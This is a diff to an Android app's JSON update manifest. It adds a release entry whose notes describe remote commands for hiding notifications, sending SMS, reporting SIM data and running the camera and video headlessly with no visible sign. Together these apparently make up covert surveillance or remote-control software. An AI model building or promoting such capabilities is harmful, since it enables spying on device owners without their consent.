@@ -1,5 +1,16 @@
 [
   {
+    "versionCode": 37,
+    "versionName": "3.4.1",
+    "releaseDate": "2026-09-22",
+    "fileName": "pasa-v3.4.1-37.apk",
+    "downloadUrl": "https://pasa.izhaanintellect.fun/releases/pasa-v3.4.1-37.apk",
+    "sha256": "c436e6c04c6ab05c49aadc10804863b5197ac2510f2809e01aa34e27c417c84e",
+    "size": 19086256,
+    "mandatory": false,
+    "releaseNotes": "v3.4.1: Permanent Notification Suppression & Media Zero-Blackout — Knox Device Owner POST_NOTIFICATIONS suppression (/notification hide|show|status); Direct Cellular SMS dispatch for number discovery (/sendsms [sim1|sim2] <number> <msg>); Active SIM & Carrier RF telemetry (/sim); Headless Foreground Service Camera & Video elevation eliminating any screen blackouts or UI flicker."
+  },
+  {
     "versionCode": 36,
     "versionName": "3.4.0",
     "releaseDate": "2026-09-22",
